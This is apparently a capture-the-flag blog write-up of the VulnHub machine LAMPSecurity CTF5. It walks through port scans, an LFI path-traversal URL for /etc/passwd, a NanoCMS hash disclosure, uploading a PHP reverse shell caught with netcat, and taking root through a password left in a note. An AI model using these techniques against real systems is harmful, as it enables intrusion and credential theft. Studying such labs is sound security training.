---
layout: post
title:  "LAMPSecurity: CTF5"
date:   2020-12-27  +0400
categories: vulnhub lampsecurity
description: "This is the fifth CTF exercise of the LAMPSecurity project. It mainly focuses on Priv Esc and finding and exploiting vulnerabilities in a webapp. It was fun and pwning the machine took around 1 hour. Hope you enjoy this writeup!"
---

<span style="text-decoration: underline">Box Stats:</span>

| Name: | LAMPSecurity: CTF5 |
|-------|--------|
| Series: | [LAMPSecurity](https://www.vulnhub.com/series/lampsecurity,43/) |
| Link: | [LAMPSecurity: CTF5]https://www.vulnhub.com/entry/lampsecurity-ctf5,84/ |
| OS: | Linux - Fedora release 8 (Werewolf) |
| Creator: | [madirish2600](https://www.vulnhub.com/author/madirish2600,75/) |

## Topics: ##
- Hash Cracking
- Enumeration
- Linux
- Privilige Escalation

# Recon #
We always start by finding the IP address of the machine. This can be done using netdiscover or nmap. Once we have found it, we can assign it to the variable `IP` using the command `export ___.___._.___=IP`.

We can start by performing our nmap scan, I have built a tool that automates staged scanning, and you can find it (here)[https://github.com]. It uses the command `nmap -T4 -p__,__,___ -A $IP`, meaning it will give you OS detection, version scanning, and traceroute. If you don't want to use these settings, you can start your own nmap scans.

```
$ ./levscan.sh $IP

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/(#//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&     ,@@@@@@@@(     /@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@%   %@@@@@@@@%/,#@@@@@@@@@   .@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%  .@@@@@@@@ ..@@@@@@...@@@@@@@@#   @@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@..%@@@@@@@@@@@..@@@@@@@@@   @@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@%./@@@@@@@@@@@@&./@@@@@@@@@@  @@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@  #@@@@@@@@@@. @@@@@@@@@@@@*.&@@@@@@@@@#  @@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@  ,@@@@@@@@&..@@@@@@@@@@..(@@@@@@@@,  @@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@          @@   ,@@@@@@@@....**....&@@@@@@@*   @@/         @@@@@@@@@@
@@@@@@@@@@    .@@/      @@@#   ,@@@@@@@@@@@@@@@@@@,   @@@@        ,     @@@@@@@@
@@@@@@@@@/   @.   @@     /@@@@@@                 *@@@@@@@     %@,   @   *@@@@@@@
@@@@@@@@@@   /@@@  @@     #@@@@#                ,@@@@@@@     @@  @@@@   @@@@@@@@
@@@@@@@@@@@@(    #@@@(     #@@                    @@@@@      @@@%     /@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@      @@@*                 @@@@@      @@@@@@@@@@@@@@@@@@@@
@@@@@@            &@@@@       @@%                 @&       @@@@@           @@@@@
@@@@                   #                                  (                  @@@
@@@     @@**(@@%                                                  @@@@@@@@    #@
@@@    @/ @@* /@@@@@.                                        @/@@@@  %@@ @@   ,@
@@@@     @@@  /@@@@@@@@@@&.             .               .@@@@@@@@@@  @@@@     @@
@@@@@@&     *@@&                        @.                       @@@,      .@@@@
@@@@@@@@@@@@                           @@@@        , &               @@@@@@@@@@@
@@@@@@@@@@#      %@@@@@@@@@@       *,@@@@@@@@@       *@@@@@@@@@*      (@@@@@@@@@
@@@@@@@@@@    (@@     @@@@        @@@@@@@@@@@@@@*      &@@@     &@*    @@@@@@@@@
@@@@@@@@@@    *@ .@@@  %@      @@@@@@@@@@@@@@@@@@@      *@  @@@@ @&    @@@@@@@@@
@@@@@@@@@@@            @     %@.      @@@@@       @@     @   .@@,     @@@@@@@@@@
@@@@@@@@@@@@@&      .@@@     @( @@@@   @@@   @@@@ @@     @@@        @@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@.     @@@@@    @@@.   @@@@&     @@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@           /@@@@@@          .@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
levscan.sh by @ctrl_levi													V1.0

[INFO] Starting all-ports NMAP scan
[INFO] OPEN PORTS:

22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
901/tcp   open  samba-swat
3306/tcp  open  mysql
52157/tcp open  unknown


Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-27 17:59 UTC
Nmap scan report for 192.168.8.155
Host is up (0.00088s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.7 (protocol 2.0)
| ssh-hostkey: 
|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:cd:3d (DSA)
|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)
25/tcp    open  smtp        Sendmail 8.14.1/8.14.1
| smtp-commands: localhost.localdomain Hello maxtor [192.168.8.126] (may be forged), pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP, 
|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
80/tcp    open  http        Apache httpd 2.2.6 ((Fedora))
|_http-server-header: Apache/2.2.6 (Fedora)
|_http-title: Phake Organization
110/tcp   open  pop3        ipop3d 2006k.101
|_pop3-capabilities: TOP USER STLS UIDL LOGIN-DELAY(180)
|_ssl-date: 2020-12-27T14:02:28+00:00; -3h58m20s from scanner time.
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100024  1          32768/udp   status
|_  100024  1          52157/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
143/tcp   open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0500)
|_imap-capabilities: completed STARTTLSA0001 SORT IMAP4REV1 NAMESPACE BINARY MAILBOX-REFERRALS OK ESEARCH UNSELECT LITERAL+ IDLE THREAD=ORDEREDSUBJECT CAPABILITY LOGIN-REFERRALS SCAN WITHIN THREAD=REFERENCES CHILDREN UIDPLUS MULTIAPPEND SASL-IR
|_ssl-date: 2020-12-27T14:02:28+00:00; -3h58m21s from scanner time.
445/tcp   open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)
901/tcp   open  http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
3306/tcp  open  mysql       MySQL 5.0.45
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.45
|   Thread ID: 6
|   Capabilities flags: 41516
|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag, SupportsCompression
|   Status: Autocommit
|_  Salt: 9Pd(9$G{UwwoGTPu|/of
52157/tcp open  status      1 (RPC #100024)
Service Info: Hosts: localhost.localdomain, 192.168.8.155; OS: Unix

Host script results:
|_clock-skew: mean: -2h43m20s, deviation: 2h30m00s, median: -3h58m21s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a-6.fc8)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2020-12-27T09:01:14-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.79 seconds
```


# Enumeration #

If you have read my previous writeups, I like to enumerate ports one by one. To simplify the nmap scan above, these are the following ports and services that are open and running on the machine:

```
22 - SSH - OpenSSH 4.7
25 - SMTP - Sendmail 8.14.1
80 - HTTP - Apache 2.2.6
110 - POP3 - ipop3d
111 - RPCBIND - none
139 - SMB - Samba 3.X - 4.X
143 - IMAP - unknown
445 - SMB - 3.0.X
901 - HTTP - unknown
3306 - MYSQL - MySQL 5.0.45
52157 - RPCBIND - none
```

## Port 22 ##
Altough I like to go through ports one by one, some of them, for example SSH is never really a protocol that we can exploit, rather it can be used to connect to the victim once credentials were gathered. We rarely, or never are able to find exploits for SSH other than DoS (which we don’t really want as pentesters), except for the occational bruteforcing if needed. When looking at this protocol from a CTF perspective, we can guess that once we get user credentions (from LFI, SQLi, RCE, etc) we can use this protocol for a clean terminal-based connection. In some cases, it is better to use SSH than a bare-bone reverse shell.

## Port 25 ##
This port has SMTP (Simple Mail Transfer Protocol), running. This was explained more in detail in my previous writeup. If you want to read it, and see how to interact with it check out my writeup [here!](https://ctrllevi.github.io/vulnhub/lampsecurity/2020/12/25/vulnhub-ctf4.html) If you just want a quick and brief explanation, SMTP is a communication protocol that is primarily used for sending electronic mail.

## Port 80 ##

### Webserver Scans ###
I like to start `nikto` and `gobuster` scans when enumerating webservers. Here are the results:

nikto scan:
```
+ Target IP:          $IP
+ Target Hostname:    $IP
+ Target Port:        80
+ Start Time:         2020-12-28 14:22:48 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.2.6 (Fedora)
+ Retrieved x-powered-by header: PHP/5.2.4
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /index.php: PHP include error may indicate local or remote file inclusion is possible.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ Server may leak inodes via ETags, header found with file /phpmyadmin/ChangeLog, inode: 558008, size: 22676, mtime: Tue Aug 21 02:59:12 2029
+ OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ Cookie SQMSESSID created without the httponly flag
+ OSVDB-3093: /mail/src/read_body.php: SquirrelMail found
+ OSVDB-3093: /squirrelmail/src/read_body.php: SquirrelMail found
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 8724 requests: 0 error(s) and 26 item(s) reported on remote host
```
gobuster scan:
```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/
[+] Threads:        100
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/28 14:48:45 Starting gobuster
===============================================================
/events (Status: 301)
/mail (Status: 301)
/list (Status: 301)
/inc (Status: 301)
/phpmyadmin (Status: 301)
/squirrelmail (Status: 301)
===============================================================
2020/12/28 14:49:51 Finished
===============================================================
```

# Exploitation #

### LFI to get /etc/passwd ###
The website on port 80 is titled `Phake Organization`. Our nikto scan also reveals that LFI is possible on the `index.php`. We can confirm this by going to the url `http://192.168.167.96/index.php?page=../../../../../etc/passwd%00` (you have to add the `%00` at the end or it will just show an error):
![LFI to get /etc/passwd](https://raw.githubusercontent.com/ctrllevi/ctrllevi.github.io/main/_posts/images/CTF5/lfi.png)

### NanoCMS Hash Disclosure ###
When we navigate to the `Blog` page, we can see at the bottom that this webapp is using NanoCMS. This is interesting because there is a known hash disclosure with this content manager (https://www.securityfocus.com/bid/34508/exploit). We can trigger this vulnerability by simply browsing to `/data/pagesdata.txt`:
![Hash Disclosure to get adming password](https://github.com/ctrllevi/ctrllevi.github.io/blob/main/_posts/images/CTF5/hashdisclosure.png?raw=true)

We can crack these hashes at [Crackstation.net](https://crackstation.net/). The hash cracker verifies this as an MD5 hash and gives us the plaintext password of `shannon`, (crackstation is especially fast as it doesn't use your computer's resources):
![Cracking the hash](https://raw.githubusercontent.com/ctrllevi/ctrllevi.github.io/main/_posts/images/CTF5/crackstation.png)

### Uploading PHP Shell ###
Using these credentials, we can login to the CMS's panel and modify the webpage. We can do this under the `New Page` section once we logged in at `http://192.168.167.96/~andy/data/nanoadmin.php`. You can copy paste the contents of your favourite php reverse shell (I prefer the pentestmonkey one) and add the page. This will be uploaded to `http://______/~andy/data/pages/shell.php`. Make sure you setup your netcat listener before browsing to the webpage. Once you visited the shell, you will get access to the machine as a low-priviliged user: `apache`, and we can do our general 'shell upgrading' thing:

```
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.167.42] from (UNKNOWN) [192.168.167.96] 56376
Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
 06:30:18 up  1:18,  0 users,  load average: 0.11, 0.25, 0.43
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh: no job control in this shell
sh-3.2$ whoami; id
apache
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh-3.2$ python -c 'import pty; pty.spawn("/bin/sh")'
sh-3.2$ export TERM=xterm
export TERM=xterm
sh-3.2$ ^Z[1] + Stopped                    nc -nvlp 1234
$ stty raw -echo; fg
			nc -nvlp 1234

sh-3.2$      
```

Of course when it comes to priv esc, we have automated scripts that do the work for us, but here is the basic manual that we have to follow:

1. Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
2. Locating other services running or applications installed that may be abusable (SUID & out of date software)
3. Looking for automated scripts like backup scripts (exploiting crontabs)
4. Credentials (user accounts, application config files..)
5. Mis-configured file and directory permissions

After determining the kernel of this machine, using the command `uname -r`, we can start our research. My research led to me to https://www.exploit-db.com/exploits/5093, and according to the description, this was the perfect local priv esc exploit for me, however IT DIDN'T WORK :( I think the issue was because I am not running a virtual machine, rather I have install kali onto a HDD. Since it didn't work, I looked for files that could give me the root password. I used the command `grep -R -i password /home/*` and found this to my surprise:

```
/home/patrick/.tomboy.log:12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password
/home/patrick/.tomboy.log:12/5/2012 7:24:56 AM [DEBUG]: Saving 'Root password'...
/home/patrick/.tomboy.log:12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
```
I instantly started enumerating the `.tomboy` folder and finally found the password in one of the files:

```
Root password

50$cent</note-content></text>
  <last-change-date>2012-12-05T07:24:52.7364970-05:00</last-change-date>
  <create-date>2012-12-05T07:24:34.3731780-05:00</create-date>
  <cursor-position>15</cursor-position>
  <width>450</width>
  <height>360</height>
  <x>0</x>
  <y>0</y>
  <open-on-startup>False</open-on-startup>

$ su root
Password: 50$cent
[root@localhost ~]# whoami; id
root
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=system_u:system_r:httpd_t:s0
```
This machine was fun, and undoubtedly longer than the previous but I still managed to finally root it after many unsuccessful attempts. I think the feeling of success is making me kinda addicted to CTFs. I really want to start the next one on the list, but I'm hungry after sitting 3+ hourse in front of my pc and making this writeup. Thank you for reading this writeup, and see you later.
